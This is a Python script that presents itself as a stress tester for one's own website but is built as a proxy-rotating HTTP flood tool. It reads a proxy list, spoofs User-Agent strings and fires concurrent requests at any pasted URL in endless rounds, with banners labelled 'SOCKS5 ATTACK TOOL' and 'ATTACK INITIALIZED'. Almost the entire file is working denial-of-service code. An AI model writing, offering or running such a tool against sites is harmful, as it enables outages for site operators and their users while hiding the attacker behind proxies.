"""
HTTP Load Testing Tool - Kendi web siten için stres testi
Proxy destekli, concurrent connection'lar
"""
import asyncio
import aiohttp
import aiohttp_socks
import random
import time
import logging
import sys
import os
from urllib.parse import urlparse
from colorama import init, Fore, Style
from tqdm import tqdm
from rich.live import Live
from rich.table import Table
from rich.console import Console
from rich import box

init(autoreset=True)
console = Console()

# Windows asyncio ProactorEventLoop debug mesajlarını bastır
logging.basicConfig(level=logging.CRITICAL)
asyncio.log.logger.setLevel(logging.CRITICAL)

# Windows socket shutdown hatalarını ignore et
if sys.platform == 'win32':
    asyncio.log.logger.setLevel(logging.FATAL)

class LoadTester:
    def __init__(self, proxies, target_url, concurrency=10, requests_per_proxy=100):
        self.proxies = proxies
        self.target_url = target_url
        self.concurrency = concurrency
        self.requests_per_proxy = requests_per_proxy
        self.success_count = 0
        self.fail_count = 0
        self.total_time = 0
        self.log_buffer = []
        self.max_logs = 10
        
    def get_proxy_url(self, proxy_str):
        """Proxy string'ini URL formatına çevir"""
        proxy_str = proxy_str.strip()
        
        if proxy_str.startswith('socks5://'):
            import re
            match = re.match(r'socks5://([^:/]+):(\d+)', proxy_str)
            if match:
                host, port = match.group(1), match.group(2)
                return f"socks5://{host}:{port}"
            else:
                raise ValueError("Invalid SOCKS5 format")
        elif '@' in proxy_str:
            auth_part, host_port = proxy_str.split('@')
            username, password = auth_part.split(':')
            host, port = host_port.split(':')
            return f"http://{username}:{password}@{host}:{port}"
        elif proxy_str.startswith('http://') or proxy_str.startswith('https://'):
            return proxy_str
        else:
            return f"http://{proxy_str}"

    def clear_line(self):
        """Clear current terminal line"""
        print('\r' + ' '*80 + '\r', end='', flush=True)
        
    def add_log(self, proxy_num, status, is_error=True, is_500=False):
        """Add log entry to rolling buffer (max 10 entries)"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        if is_500:
            log_entry = f"[magenta]⚠️  [{timestamp}] Proxy {proxy_num}: HTTP {status}[/magenta]"
        elif is_error:
            log_entry = f"[red]⚠️  [{timestamp}] Proxy {proxy_num}: HTTP {status}[/red]"
        else:
            log_entry = f"[green]✅ [{timestamp}] Proxy {proxy_num}: HTTP {status}[/green]"
        self.log_buffer.append(log_entry)
        if len(self.log_buffer) > self.max_logs:
            self.log_buffer.pop(0)
        # Debug: print to console directly
        console.print(f"[dim]Log added: {proxy_num} HTTP {status} | Buffer size: {len(self.log_buffer)}[/dim]")
        # Update Live display if available
        if hasattr(self, 'live_display') and self.live_display:
            from rich.console import Group
            from rich.text import Text
            pct = (self.completed_requests/self.total_req_count*100) if self.total_req_count > 0 else 0
            progress_text = Text.from_markup(f"[bold green]Attacking: {self.completed_requests}/{self.total_req_count} ({pct:.1f}%)[/bold green]")
            combined = Group(progress_text, Text(""), self.get_log_table())
            self.live_display.update(combined)
            self.live_display.refresh()
    
    def get_log_table(self):
        """Create Rich panel from log buffer"""
        from rich.text import Text
        from rich.panel import Panel
        from rich import box
        
        # Create table with logs
        from rich.table import Table
        table = Table(
            show_header=False,
            box=None,
            show_edge=False,
            padding=0
        )
        table.add_column()
        
        # Add logs to table
        for log in self.log_buffer:
            table.add_row(Text.from_markup(log))
        # Fill empty rows
        for _ in range(self.max_logs - len(self.log_buffer)):
            table.add_row("")
        
        panel = Panel(
            table,
            title="[yellow]🔥 Live Request Log[/yellow]",
            border_style="yellow",
            padding=(0, 2)
        )
        return panel
        
    async def make_request(self, session, proxy_str, request_num):
        """Tek bir istek yap - mevcut session ile"""
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
                ]),
                'Accept': '*/*',
                'Connection': 'keep-alive',
            }
            start = time.time()
            async with session.get(self.target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                elapsed = time.time() - start
                self.completed_requests += 1
                if resp.status == 200:
                    self.success_count += 1
                    self.total_time += elapsed
                    self.add_log(request_num, 200, is_error=False)
                    return True
                elif resp.status == 500:
                    self.fail_count += 1
                    self.add_log(request_num, 500, is_error=True, is_500=True)
                    return False
                else:
                    # Don't log other HTTP codes
                    self.fail_count += 1
                    return False  
        except Exception as e:
            self.fail_count += 1
            self.completed_requests += 1
            # Don't log timeout/connection errors
            return False
    async def run_proxy_batch(self, proxy_str, batch_num):
        """Bir proxy ile çoklu istek - HIZLI MOD"""
        try:
            proxy_url = self.get_proxy_url(proxy_str)
            connector = aiohttp_socks.ProxyConnector.from_url(
                proxy_url,
                verify_ssl=False,
                limit=50,
                limit_per_host=50,
                ttl_dns_cache=300,
                use_dns_cache=True,
            )
            async with aiohttp.ClientSession(
                connector=connector,
                raise_for_status=False
            ) as session:
                tasks = []
                for i in range(self.requests_per_proxy):
                    task = self.make_request(session, proxy_str, f"{batch_num}-{i+1}")
                    tasks.append(task)
                await asyncio.gather(*tasks, return_exceptions=True)    
        except Exception as e:
            self.fail_count += self.requests_per_proxy
            self.completed_requests += self.requests_per_proxy
    def print_banner(self):
        """Print colorful banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    🚀 ATTACK INITIALIZED 🚀                  ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.YELLOW}🎯 Target:{Fore.WHITE}         {self.target_url:<45}{Fore.CYAN}
║  {Fore.YELLOW}🔥 Proxies:{Fore.WHITE}        {len(self.proxies):<4} proxies active                          {Fore.CYAN}
║  {Fore.YELLOW}⚡ Concurrency:{Fore.WHITE}    {self.concurrency:<4} parallel connections                    {Fore.CYAN}
║  {Fore.YELLOW}📊 Total Req:{Fore.WHITE}     {len(self.proxies) * self.requests_per_proxy:<6} requests to send                      {Fore.CYAN}
║  {Fore.YELLOW}⏱️  Rate Limit:{Fore.WHITE}   25 proxy/sec                                  {Fore.CYAN}
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
        
    async def run(self):
        """Start all attacks"""
        self.print_banner()
        start_time = time.time()
        total_requests = len(self.proxies) * self.requests_per_proxy
        
        # Simple progress text + Live Log
        from rich.panel import Panel
        from rich.console import Group
        from rich.text import Text
        
        self.completed_requests = 0
        self.total_req_count = total_requests
        
        # Combined display: ASCII C + Progress Text + Log Panel
        ascii_c = """
[bold yellow]   ,--,                                        ,----,                                                             [/bold yellow]
[bold yellow] ,---.'|        ,----..                       ,/   .`|                                                             [/bold yellow]
[bold yellow] |   | :       /   /   \     .--.--.        ,`   .'  :             ,---,         ,---,                  .--.--.    [/bold yellow]
[bold yellow] :   : |      /   .     :   /  /    '.    ;    ;     /           .'  .' `\     .'  .' `\               /  /    '.  [/bold yellow]
[bold yellow] |   ' :     .   /   ;.  \ |  :  /`. /  .'___,/    ,'          ,---.'     \  ,---.'     \     ,---.   |  :  /`. / [/bold yellow]
[bold yellow] ;   ; '    .   ;   /  ` ; ;  |  |--`   |    :     |           |   |  .`\  | |   |  .`\  |   '   ,'\  ;  |  |--`  [/bold yellow]
[bold yellow] '   | |__  ;   |  ; \ ; | |  :  ;_     ;    |.';  ;           :   : |  '  | :   : |  '  |  /   /   | |  :  ;_     [/bold yellow]
[bold yellow] |   | :.'| |   :  | ; | '  \  \    `.  `----'  |  |           |   ' '  ;  : |   ' '  ;  : .   ; ,. :  \  \    `.  [/bold yellow]
[bold yellow] '   :    ; .   |  ' ' ' :   `----.   \     '   :  ;           '   | ;  .  | '   | ;  .  | '   | |: :   `----.   \ [/bold yellow]
[bold yellow] |   |  ./  '   ;  \; /  |   __ \  \  |     |   |  '           |   | :  |  ' |   | :  |  ' '   | .; :   __ \  \  | [/bold yellow]
[bold yellow] ;   : ;     \   \  ',  /   /  /`--'  /     '   :  |           '   : | /  ;  '   : | /  ;  |   :    |  /  /`--'  / [/bold yellow]
[bold yellow] |   ,/       ;   :    /   '--'.     /      ;   |.'            |   | '` ,/   |   | '` ,/    \   \  /  '--'.     /  [/bold yellow]
[bold yellow] '---'         \   \ .'      `--'---'       '---'              ;   :  .'     ;   :  .'       `----'     `--'---'   [/bold yellow]
[bold yellow]               `---`                                          |   ,.'       |   ,.'                               [/bold yellow]
[bold yellow]                                                              '---'         '---'                                 [/bold yellow]
"""
        def get_combined_display():
            pct = (self.completed_requests/self.total_req_count*100) if self.total_req_count > 0 else 0
            ascii_art = Text.from_markup(ascii_c)
            progress_text = Text.from_markup(f"[bold green]Attacking: {self.completed_requests}/{self.total_req_count} ({pct:.1f}%)[/bold green]")
            log_panel = self.get_log_table()
            return Group(ascii_art, progress_text, Text(""), log_panel)
        
        with Live(get_combined_display(), auto_refresh=False, console=console, screen=False) as live:
            self.live_display = live
            
            semaphore = asyncio.Semaphore(self.concurrency)
            PROXIES_PER_SECOND = 25
            
            async def limited_run(proxy, i):
                async with semaphore:
                    await self.run_proxy_batch(proxy, i+1)
                    
            tasks_list = []
            for i, proxy in enumerate(self.proxies):
                t = limited_run(proxy, i)
                tasks_list.append(t)
                if (i + 1) % PROXIES_PER_SECOND == 0 and i < len(self.proxies) - 1:
                    await asyncio.sleep(1)
                    
            await asyncio.gather(*tasks_list)
        
        total_time = time.time() - start_time
        total_req = self.success_count + self.fail_count
        success_rate = (self.success_count/total_req)*100 if total_req > 0 else 0
        avg_response = (self.total_time/self.success_count if self.success_count else 0)
        rps = total_req/total_time if total_time > 0 else 0
        
        # Results table
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    📊 ATTACK COMPLETE 📊                     ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║  {Fore.GREEN}✅ Success:{Fore.WHITE}        {self.success_count:<8} requests                     {Fore.CYAN}║")
        print(f"║  {Fore.RED}❌ Failed:{Fore.WHITE}         {self.fail_count:<8} requests                     {Fore.CYAN}║")
        print(f"║  {Fore.YELLOW}📈 Success Rate:{Fore.WHITE}   {success_rate:>6.1f}%                              {Fore.CYAN}║")
        print(f"║  {Fore.MAGENTA}⏱️  Total Time:{Fore.WHITE}    {total_time:>6.1f}s                              {Fore.CYAN}║")
        print(f"║  {Fore.BLUE}⚡ Avg Response:{Fore.WHITE}   {avg_response:>6.3f}s                              {Fore.CYAN}║")
        print(f"║  {Fore.GREEN}🚀 RPS:{Fore.WHITE}            {rps:>6.1f} req/s                          {Fore.CYAN}║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
def silence_proactor_errors(loop, context):
    """Windows ProactorEventLoop hatalarını sessizce ignore et"""
    exception = context.get('exception')
    if exception and 'ConnectionResetError' in str(type(exception).__name__):
        return
    if 'ProactorBasePipeTransport' in str(context.get('message', '')):
        return
    loop.default_exception_handler(context)
async def main():
    loop = asyncio.get_event_loop()
    loop.set_exception_handler(silence_proactor_errors)
    
    # Print welcome banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║                     {Fore.CYAN}🔥 SOCKS5 ATTACK TOOL 🔥{Fore.MAGENTA}                 ║
║                 {Fore.WHITE}socks5 proxy https attack tool{Fore.MAGENTA}               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    with open("proxies.txt", "r") as f:
        proxies = list(set([line.strip() for line in f if line.strip()]))
    
    print(f"{Fore.YELLOW}🌐 Paste your URL (e.g.: https://example.com/):{Style.RESET_ALL}")
    target = input(f"{Fore.CYAN}> {Style.RESET_ALL}").strip()
    if not target.startswith('http'):
        target = 'https://' + target
        
    print(f"\n{Fore.YELLOW}⚡ Concurrency (how many proxies at once): {Fore.WHITE}[100]{Style.RESET_ALL}")
    concurrency = input(f"{Fore.CYAN}> {Style.RESET_ALL}").strip()
    concurrency = int(concurrency) if concurrency else 10
    
    print(f"\n{Fore.YELLOW}📊 Requests per proxy: {Fore.WHITE}[100]{Style.RESET_ALL}")
    req_per_proxy = input(f"{Fore.CYAN}> {Style.RESET_ALL}").strip()
    req_per_proxy = int(req_per_proxy) if req_per_proxy else 100
    
    round_num = 1
    while True:
        print(f"\n{Fore.MAGENTA}{'═'*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}                    🔄 ROUND {round_num} STARTING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'═'*60}{Style.RESET_ALL}")
        tester = LoadTester(proxies, target, concurrency, req_per_proxy)
        await tester.run()
        print(f"\n{Fore.GREEN}✅ Round {round_num} completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⏱️  1 second until next round...{Style.RESET_ALL}")
        print(f"{Fore.RED}(Press Ctrl+C to stop){Style.RESET_ALL}")
        await asyncio.sleep(1)
        round_num += 1
        
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}🛑 Stopped. Exiting...{Style.RESET_ALL}")
